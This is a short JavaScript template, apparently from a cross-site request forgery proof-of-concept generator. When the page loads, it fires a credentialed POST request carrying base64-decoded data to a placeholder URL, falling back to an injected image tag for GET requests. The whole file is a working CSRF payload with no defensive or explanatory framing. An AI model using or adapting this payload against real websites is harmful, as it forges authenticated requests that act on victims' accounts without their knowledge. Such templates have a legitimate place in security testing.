document.write("<script src=\"https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js\"></script>");   
var method = "POST";

document.onreadystatechange = senddata;

function senddata(){
	if(method == "POST"){
		$.ajax({
			type: "POST",
			url: "<+|url|+>",
			data: window.atob("<+|postdata|+>"),
			beforeSend: function(xhr) {
				xhr.withCredentials = true;
			}
		});
	}else{
		document.write('<img src="<+|url|+>">');   
	}
}